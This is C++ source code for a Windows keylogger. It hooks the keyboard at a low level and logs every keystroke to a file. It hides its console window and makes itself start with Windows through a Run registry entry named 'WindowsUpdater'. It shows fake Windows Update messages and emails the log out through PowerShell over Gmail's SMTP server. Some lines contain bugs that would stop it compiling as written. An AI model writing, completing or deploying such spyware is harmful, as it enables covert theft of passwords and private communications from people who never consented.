#include <string>
#include <stack>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>

#define VK_VOLUME_MUTE 0xAD
#define VK_VOLUME_DOWN 0xAE
#define VK_VOLUME_UP 0xAF

using namespace std;

const  string LOGFILENAME = "WindowsData.txt";
bool invisible = true;
bool autostartOnStartup = true;

const string deviceIdentifier = "hirushaPC";

const string sendEmailAddr = "";
const string sendEmailPassword = "";
const string toEmailAddr = "";



void sendEmailOnce(void) {

    string email = "Send-MailMessage -To \"" + toEmailAddr + "\" -From \"" + sendEmailAddr + "\" -Subject " + deviceIdentifier + " -Body \"...\" -Credential \"" + sendEmailPassword + "\"  -Attachments \".\\" + LOGFILENAME + "\" -Priority High -ExecutionPolicy bypass -SmtpServer \"smtp.gmail.com\" -Port 587"
    system(email);

}

void restartOnStartup(void) {
    char re[MAX_PATH];
    string progPath = string(re, GetModuleFileName(NULL, re, MAX_PATH));
    HKEY hkey = NULL;
    long createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    long status = RegSetValueEx(hkey, "WindowsUpdater", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
}

int isCapsLock(void)
{
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

void log(char s1[])
{
    FILE* file = fopen(LOGFILENAME, "a+");
    int i = 0;
    fputs(s1, file);
    i++;
    if (i == 50)
    {
        fputc('\n', file);
        i = 0;
    }
    fclose(file);
}

LRESULT CALLBACK
LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;
    char val[5];
    DWORD dwMsg = 1;
    switch (wParam)
    {

    case WM_KEYDOWN:
    {
        DWORD vkCode = pKeyBoard->vkCode;

        if ((vkCode >= 39) && (vkCode <= 64))
        {
            if (GetAsyncKeyState(VK_SHIFT))
            {
                switch (vkCode)
               {
                case 0x30:
                    log(")");
                    break;
                case 0x31:
                    log("!");
                    break;
                case 0x32:
                    log("@");
                    break;
                case 0x33:
                    log("#");
                    break;
                case 0x34:
                    log("$");
                    break;
                case 0x35:
                    log("%");
                    break;
                case 0x36:
                    log("^");
                    break;
                case 0x37:
                    log("&");
                    break;
                case 0x38:
                    log("*");
                    break;
                case 0x39:
                    log("(");
                    break;
                }
            }
            else
            {
                sprintf(val, "%c", vkCode);
                log(val);
            }
        }
        else if ((vkCode > 64) && (vkCode < 91))
        {
            if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
            {
                vkCode += 32;
            }
            sprintf(val, "%c", vkCode);
            log(val);
        }
        else
        {
            switch (vkCode)
            {
            case VK_CANCEL:
                log("[Cancel]");
                break;
            case VK_SPACE:
                log(" ");
                break;
            case VK_LCONTROL:
                log("[LCtrl]");
                break;
            case VK_RCONTROL:
                log("[RCtrl]");
                break;
            case VK_LMENU:
                log("[LAlt]");
                break;
            case VK_RMENU:
                log("[RAlt]");
                break;
            case VK_LWIN:
                log("[LWindows]");
                break;
            case VK_RWIN:
                log("[RWindows]");
                break;
            case VK_APPS:
                log("[Applications]");
                break;
            case VK_SNAPSHOT:
                log("[PrintScreen]");
                break;
            case VK_INSERT:
                log("[Insert]");
                break;
            case VK_PAUSE:
                log("[Pause]");
                break;
            case VK_VOLUME_MUTE:
                log("[VolumeMute]");
                break;
            case VK_VOLUME_DOWN:
                log("[VolumeDown]");
                break;
            case VK_VOLUME_UP:
                log("[VolumeUp]");
                break;
            case VK_SELECT:
                log("[Select]");
                break;
            case VK_HELP:
                log("[Help]");
                break;
            case VK_EXECUTE:
                log("[Execute]");
                break;
            case VK_DELETE:
                log("[Delete]");
                break;
            case VK_CLEAR:
                log("[Clear]");
                break;
            case VK_RETURN:
                log("[Enter]");
                break;
            case VK_BACK:
                log("[Backspace]");
                break;
            case VK_TAB:
                log("[Tab]");
                break;
            case VK_ESCAPE:
                log("[Escape]");
                break;
            case VK_LSHIFT:
                log("[LShift]");
                break;
            case VK_RSHIFT:
                log("[RShift]");
                break;
            case VK_CAPITAL:
                log("[CapsLock]");
                break;
            case VK_NUMLOCK:
                log("[NumLock]");
                break;
            case VK_SCROLL:
                log("[ScrollLock]");
                break;
            case VK_HOME:
                log("[Home]");
                break;
            case VK_END:
                log("[End]");
                break;
            case VK_PLAY:
                log("[Play]");
                break;
            case VK_ZOOM:
                log("[Zoom]");
                break;
            case VK_DIVIDE:
                log("[/]");
                break;
            case VK_MULTIPLY:
                log("[*]");
                break;
            case VK_SUBTRACT:
                log("[-]");
                break;
            case VK_ADD:
                log("[+]");
                break;
            case VK_PRIOR:
                log("[PageUp]");
                break;
            case VK_NEXT:
                log("[PageDown]");
                break;
            case VK_LEFT:
                log("[LArrow]");
                break;
            case VK_RIGHT:
                log("[RArrow]");
                break;
            case VK_UP:
                log("[UpArrow]");
                break;
            case VK_DOWN:
                log("[DownArrow]");
                break;
            case VK_NUMPAD0:
                log("[0]");
                break;
            case VK_NUMPAD1:
                log("[1]");
                break;
            case VK_NUMPAD2:
                log("[2]");
                break;
            case VK_NUMPAD3:
                log("[3]");
                break;
            case VK_NUMPAD4:
                log("[4]");
                break;
            case VK_NUMPAD5:
                log("[5]");
                break;
            case VK_NUMPAD6:
                log("[6]");
                break;
            case VK_NUMPAD7:
                log("[7]");
                break;
            case VK_NUMPAD8:
                log("[8]");
                break;
            case VK_NUMPAD9:
                log("[9]");
                break;
            case VK_F1:
                log("[F1]");
                break;
            case VK_F2:
                log("[F2]");
                break;
            case VK_F3:
                log("[F3]");
                break;
            case VK_F4:
                log("[F4]");
                break;
            case VK_F5:
                log("[F5]");
                break;
            case VK_F6:
                log("[F6]");
                break;
            case VK_F7:
                log("[F7]");
                break;
            case VK_F8:
                log("[F8]");
                break;
            case VK_F9:
                log("[F9]");
                break;
            case VK_F10:
                log("[F10]");
                break;
            case VK_F11:
                log("[F11]");
                break;
            case VK_F12:
                log("[F12]");
                break;
            case VK_F13:
                log("[F13]");
                break;
            case VK_F14:
                log("[F14]");
                break;
            case VK_F15:
                log("[F15]");
                break;
            case VK_F16:
                log("[F16]");
                break;
            case VK_F17:
                log("[F17]");
                break;
            case VK_F18:
                log("[F18]");
                break;
            case VK_F19:
                log("[F19]");
                break;
            case VK_F20:
                log("[F20]");
                break;
            case VK_F21:
                log("[F21]");
                break;
            case VK_F22:
                log("[F22]");
                break;
            case VK_F23:
                log("[F23]");
                break;
            case VK_F24:
                log("[F24]");
                break;
            case VK_OEM_2:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("?");
                else
                    log("/");
                break;
            case VK_OEM_3:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("~");
                else
                    log("`");
                break;
            case VK_OEM_4:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("{");
                else
                    log("[");
                break;
            case VK_OEM_5:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("|");
                else
                    log("\\");
                break;
            case VK_OEM_6:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("}");
                else
                    log("]");
                break;
            case VK_OEM_7:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("\\");
                else
                    log("'");
                break;
                break;
            case 0xBC:                //comma
                if (GetAsyncKeyState(VK_SHIFT))
                    log("<");
                else
                    log(",");
                break;
            case 0xBE:              //Period
                if (GetAsyncKeyState(VK_SHIFT))
                    log(">");
                else
                    log(".");
                break;
            case 0xBA:              //Semi Colon same as VK_OEM_1
                if (GetAsyncKeyState(VK_SHIFT))
                    log(":");
                else
                    log(";");
                break;
            case 0xBD:              //Minus
                if (GetAsyncKeyState(VK_SHIFT))
                    log("_");
                else
                    log("-");
                break;
            case 0xBB:              //Equal
                if (GetAsyncKeyState(VK_SHIFT))
                    log("+");
                else
                    log("=");
                break;
            default:
                dwMsg += pKeyBoard->scanCode << 16;
                dwMsg += pKeyBoard->flags << 24;
                char key[16];
                GetKeyNameText(dwMsg, key, 15);
                log(key);
            }
        }
        break;
    }
    default:
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    return 0;
}

DWORD WINAPI
KeyLogger(LPVOID lpParameter)
{
    HHOOK hKeyHook;
    HINSTANCE hExe = GetModuleHandle(NULL);

    if (!hExe)
    {
        return 1;
    }
    else
    {
        hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC) LowLevelKeyboardProc, hExe, 0);
        RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) != 0)
        {
            if (msg.message == WM_HOTKEY)
            {
                UnhookWindowsHookEx(hKeyHook);
                return 0;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(hKeyHook);
    }
    return 0;
}

int start(char* argv[])
{
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) KeyLogger,
            (LPVOID) argv[0], 0, NULL );

    if (hThread)
    {
        return WaitForSingleObject(hThread, INFINITE);
    }
    return 1;
}

char fileName[MAX_PATH];

void hide(void)
{
    HWND stealth;
    stealth = FindWindow("ConsoleWindowClass", NULL );
    ShowWindow(stealth, 0);
}

void init(void)
{
    printf("Starting Windows Update Services (Get-WUAVersion)\nScanning for Updates\nPlease Wait!...\n");
    sendEmailOnce();
}

void powerdown(void)
{
    printf("Quitting Windows Update on User Command (0x4bd880)");
}

int main(int argc, char* argv[])
{
    if (autostartOnStartup == true) {
        restartOnStartup();
    }
    int startKeyLogging(char* argv[]);
    if (invisible) hide();
    init();
    start(argv);
    atexit(powerdown);
}
